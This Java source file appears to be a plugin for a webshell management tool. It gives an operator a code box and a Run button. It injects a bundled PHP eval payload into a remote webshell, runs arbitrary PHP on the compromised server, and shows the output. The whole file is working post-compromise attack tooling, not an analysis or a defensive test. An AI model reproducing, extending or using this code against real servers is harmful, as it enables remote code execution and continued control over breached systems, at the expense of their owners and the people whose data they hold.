package vip.youwe.shell.shells.plugins.php;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "PhpDynamicPayload", Name = "P_Eval_Code")
public class PhpEvalCode implements Plugin {

    private static final String CLASS_NAME = "PHP_Eval_Code";

    private JPanel panel = new JPanel(new BorderLayout());
    private RTextArea codeTextArea = new RTextArea();
    private RTextArea resultTextArea = new RTextArea();
    private JButton runButton = new JButton("Run");
    private boolean loadState;

    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public PhpEvalCode() {
        JSplitPane pane1 = new JSplitPane();
        JSplitPane pane2 = new JSplitPane();
        JPanel runButtonPanel = new JPanel(new FlowLayout());

        runButtonPanel.add(this.runButton);
        this.codeTextArea.setBorder(new TitledBorder("code"));
        this.resultTextArea.setBorder(new TitledBorder("result"));
        this.codeTextArea.setText("\necho \"hello word!\";\t\t\t\t\t");
        pane1.setOrientation(1);
        pane1.setLeftComponent(new JScrollPane(this.codeTextArea));
        pane1.setRightComponent(runButtonPanel);
        pane2.setOrientation(1);
        pane2.setLeftComponent(pane1);
        pane2.setRightComponent(new JScrollPane(this.resultTextArea));
        this.panel.add(pane2);
    }

    private void Load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/evalCode.php");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.error("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String code = this.codeTextArea.getText();
        if (code != null && code.trim().length() > 0) {
            String resultString = this.eval(code);
            this.resultTextArea.setText(resultString);
        } else {
            JOptionPane.showMessageDialog(this.panel, "code is null", "提示", 2);
        }
    }

    public String eval(String code) {
        return this.eval(code, new ReqParameter());
    }

    public String eval(String code, ReqParameter reqParameter) {
        reqParameter.add("plugin_eval_code", code);
        if (!this.loadState) {
            Load();
        }
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter));
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

}
